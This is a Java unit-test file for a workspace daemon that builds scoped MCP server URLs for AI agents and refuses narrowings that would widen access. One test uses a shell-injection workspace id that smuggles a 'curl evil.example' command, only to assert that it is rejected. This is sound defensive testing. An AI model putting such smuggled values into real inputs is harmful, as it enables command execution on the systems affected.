package eu.wohlben.qits.workspacedaemon;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import eu.wohlben.qits.agents.AgentMcpNarrowing;
import eu.wohlben.qits.agents.AgentMcpScope;
import eu.wohlben.qits.agents.McpEndpoints;
import eu.wohlben.qits.agents.ScopedMcp;
import eu.wohlben.qits.commands.InvalidCommandRequestException;
import java.util.List;
import java.util.Optional;
import org.junit.jupiter.api.Test;

/**
 * This daemon's half of the {@link eu.wohlben.qits.agents.AgentMcpServers} seam.
 *
 * <p>The scope mapping itself is proven <b>in the harness library</b>, against a fixture copy of
 * this class, where the rendered command lines are asserted byte for byte on both harnesses. What is
 * proven here is the half the library cannot have: the urls this daemon builds for a given narrowing,
 * and the narrowings it refuses.
 *
 * <p>Those refusals are the reason the seam exists at all. Its default implementation ignores the
 * narrowing and answers the scope's own mapping, which makes the editor's three checkboxes a
 * description of what the daemon already did rather than something an operator can change — so
 * {@code honoursNarrowing()} being true is itself an assertion below.
 */
class WorkspaceMcpServersTest {

  private static final String PROJECT = "22222222-2222-2222-2222-222222222222";
  private static final String REPO = "qits-stt";
  private static final String WORKSPACE = "ws-1";

  private static final McpEndpoints ENDPOINTS =
      new McpEndpoints() {
        @Override
        public String mcpUrl(String server) {
          return switch (server) {
            case "repository" -> "http://qits:8080/projects/mcp";
            case "observability" -> "http://qits:8080/observability/mcp";
            case "actions" -> "http://qits:8080/actions/mcp";
            default -> throw new IllegalArgumentException("Unknown MCP server: " + server);
          };
        }

        @Override
        public String projectId() {
          return PROJECT;
        }
      };

  private final WorkspaceMcpServers servers = new WorkspaceMcpServers(ENDPOINTS, REPO, WORKSPACE);

  @Test
  void theSeamIsImplementedRatherThanLeftOnTheLibrarysDefault() {
    // False here would mean every launch that attaches a server records that its addressing was
    // this daemon's guess rather than the document's instruction — visible, but still a lie on the
    // editor's form.
    assertTrue(servers.honoursNarrowing());
  }

  @Test
  void repositoryScopeAttachesTheNarrowedRepositoryServerAndTelemetryBesideIt() {
    List<ScopedMcp> attached = servers.serversFor(AgentMcpScope.REPOSITORY);

    assertEquals(2, attached.size());
    assertEquals(
        "http://qits:8080/projects/mcp?projectId="
            + PROJECT
            + "&repositoryId="
            + REPO
            + "&workspaceId="
            + WORKSPACE,
        attached.get(0).url());
    // No projectId: qits-observability has no notion of one, and its tool filter hides everything
    // unless both of the other two are present.
    assertEquals(
        "http://qits:8080/observability/mcp?repositoryId=" + REPO + "&workspaceId=" + WORKSPACE,
        attached.get(1).url());
  }

  @Test
  void theNarrowingTheDocumentAsksForIsWhatIsBuilt() {
    // The canonical order — projectId, repositoryId, workspaceId — is contract rather than detail:
    // the rendered command line is asserted as a literal on both harnesses.
    assertEquals(
        "http://qits:8080/projects/mcp?projectId=" + PROJECT + "&workspaceId=" + WORKSPACE,
        serverFor("repository", new AgentMcpNarrowing(true, false, true)).url());
    assertEquals(
        "http://qits:8080/projects/mcp?repositoryId=" + REPO,
        serverFor("repository", new AgentMcpNarrowing(false, true, false)).url());
  }

  @Test
  void noNarrowingAtAllIsTheWholePlatformRatherThanARefusal() {
    assertEquals(
        "http://qits:8080/projects/mcp",
        serverFor("repository", new AgentMcpNarrowing(false, false, false)).url());
  }

  @Test
  void aServerKeepsItsShippedPreApprovalWhateverTheNarrowing() {
    // Pre-approval is policy about what this product's agents may do without asking, keyed by
    // server; it is not something the narrowing moves.
    assertEquals(
        servers.serversFor(AgentMcpScope.REPOSITORY).get(0).allowedTools(),
        serverFor("repository", new AgentMcpNarrowing(true, true, true)).allowedTools());
  }

  @Test
  void aProjectNarrowingOnAProjectBlindServerIsRefusedRatherThanDropped() {
    // Dropping the parameter would answer a BROADER url than was asked for, which is the one
    // failure a narrowing exists to prevent.
    InvalidCommandRequestException refused =
        assertThrows(
            InvalidCommandRequestException.class,
            () -> servers.serverFor(
                "observability", AgentMcpScope.REPOSITORY, new AgentMcpNarrowing(true, true, true)));
    assertTrue(refused.getMessage().contains("observability"), refused.getMessage());

    assertThrows(
        InvalidCommandRequestException.class,
        () -> servers.serverFor(
            "actions", AgentMcpScope.ACTIONS, new AgentMcpNarrowing(true, true, false)));
  }

  @Test
  void anIdOutsideThePlatformsGrammarNeverReachesAShellArgument() {
    // The url ends up inside a single-quoted launch argument and the renderer does no escaping of
    // its own, so the grammar check is the boundary.
    WorkspaceMcpServers hostile =
        new WorkspaceMcpServers(ENDPOINTS, REPO, "ws-1' && curl evil.example");

    assertThrows(
        InvalidCommandRequestException.class,
        () -> hostile.serverFor(
            "repository", AgentMcpScope.REPOSITORY, new AgentMcpNarrowing(false, false, true)));
  }

  @Test
  void aKeyThisDaemonDoesNotServeAnswersEmptyRatherThanInventingAUrl() {
    // The launch turns this into its own refusal naming the surface — a session missing a server it
    // was configured with looks entirely normal and cannot do half its job.
    assertEquals(
        Optional.empty(),
        servers.serverFor("weather", AgentMcpScope.REPOSITORY, new AgentMcpNarrowing(false, false, false)));
  }

  @Test
  void scopeDoesNotVetoAKeyOnceTheDocumentHasNamedItAndItsNarrowing() {
    // serversFor omits observability at PROJECT scope only because the scope carries no repository
    // or workspace to narrow it with. A document that asks for that narrowing has said what the
    // scope could not, and refusing it on the scope's say-so would make the checkbox a lie the
    // other way round.
    assertEquals(
        "http://qits:8080/observability/mcp?repositoryId=" + REPO + "&workspaceId=" + WORKSPACE,
        serverFor("observability", new AgentMcpNarrowing(false, true, true), AgentMcpScope.PROJECT)
            .url());
  }

  private ScopedMcp serverFor(String key, AgentMcpNarrowing narrowing) {
    return serverFor(key, narrowing, AgentMcpScope.REPOSITORY);
  }

  private ScopedMcp serverFor(String key, AgentMcpNarrowing narrowing, AgentMcpScope scope) {
    return servers.serverFor(key, scope, narrowing).orElseThrow();
  }
}
